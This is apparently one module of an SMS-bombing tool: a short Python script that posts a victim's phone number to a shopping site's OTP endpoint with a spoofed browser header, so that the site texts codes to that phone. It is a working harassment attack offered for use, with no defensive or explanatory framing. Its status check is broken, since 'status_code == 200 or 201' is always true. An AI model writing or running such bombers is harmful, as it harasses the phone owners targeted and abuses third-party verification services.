import requests
from time import sleep
import random

heads = [
    {
        'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'accept': 'application/json, text/plain, */*',
    },
]

def pindo_bomber(number):
    random_choose = random.choice(heads)
    pindo_api = 'https://takhfifan.com/ajax/account/existOtp'
    json_request_api = {"phone":"0"+number}
    try:
        req = requests.post(pindo_api,json=json_request_api,headers=random_choose)
        if req.status_code == 200 or 201:
            print('pindo code sent!')
        else:
            print(f'pindo code: {req.status_code}')
    except:
        print('pindo error!')

pindo_bomber("")
